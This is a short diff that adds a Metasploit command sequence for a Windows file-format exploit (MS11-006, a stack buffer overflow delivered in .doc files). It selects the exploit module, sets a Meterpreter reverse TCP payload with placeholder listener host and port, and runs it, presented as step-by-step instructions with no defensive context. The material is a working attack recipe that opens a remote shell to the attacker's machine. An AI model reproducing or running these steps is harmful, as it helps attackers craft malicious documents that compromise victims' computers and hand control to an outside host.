@@ -1,0 +1,7 @@
+# This is a file format exploit affecting MS Windows machines, utilizing stack based buffer overflows in .doc files, do the following:
+
+use exploit/windows/fileformat/ms11_006_createsizeddibsection
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [IP]
+set LPORT [portnum]
+exploit
